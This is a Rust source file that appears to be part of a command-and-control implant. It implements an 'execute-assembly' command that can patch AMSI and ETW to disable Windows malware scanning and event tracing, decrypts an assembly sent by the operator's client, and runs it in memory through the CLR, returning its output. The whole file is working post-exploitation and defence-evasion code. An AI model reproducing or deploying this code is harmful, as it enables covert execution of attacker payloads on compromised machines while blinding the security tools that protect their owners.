use clroxide::clr::Clr;
use fmtools::format; // using obfstr to obfuscate
use std::string::ToString;

use crate::internal::client::Client;
use crate::internal::patches::{patch_amsi, patch_etw};

// pub(crate) fn clr_exec_with_console(assembly: &[u8], args: &str) -> Result<String, String> {
//     !todo!("clr_exec_with_console")
// }

fn parse_arg_to_bool(s: &str) -> bool {
    matches!(s, "1")
}

pub(crate) fn execute_assembly(args: &[String], client: &Client) -> String {
    let mut result = String::new();
    let patch_amsi_arg = args.first().map_or(false, |s| parse_arg_to_bool(s));
    let block_etw_arg = args.get(1).map_or(false, |s| parse_arg_to_bool(s));
    let encrypted_assembly = &args[2];
    let assembly_args = &args[3..];

    if assembly_args.is_empty() {
        return format!("Invalid number of arguments received. Usage: 'execute-assembly <BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments>'.");
    }

    // Execute patches
    if patch_amsi_arg {
        match patch_amsi() {
            Ok(out) => result.push_str(&format!({out}"\n")),
            Err(err) => result.push_str(&format!({err}"\n")),
        }
    }

    if block_etw_arg {
        match patch_etw() {
            Ok(out) => result.push_str(&format!({out}"\n")),
            Err(err) => result.push_str(&format!({err}"\n")),
        }
    }

    // Decrypt the assembly
    let assembly = match client.decrypt_and_decompress(encrypted_assembly) {
        Ok(assembly) => assembly,
        Err(_e) => return format!("Failed to decrypt assembly: "{_e}),
    };

    // Initialize the CLR and assembly using ClrOxide
    // We need to split and convert the arguments to a Vec<String>,
    // because any argument in the array may contain multiple arguments with spaces
    let mut clr = match Clr::new(
        assembly,
        assembly_args
            .iter()
            .flat_map(|s| s.split(' '))
            .map(ToString::to_string)
            .collect(),
    ) {
        Ok(clr) => clr,
        Err(err) => {
            result.push_str(&format!("Failed to load assembly: "{err}));
            return result;
        }
    };

    // Execute the assembly and capture the output
    result.push_str(&format!("Executing assembly...\n"));
    match clr.run() {
        Ok(output) => result.push_str(&output),
        Err(err) => {
            result.push_str(&format!("Failed to execute assembly: "{err}));
        }
    };

    result
}
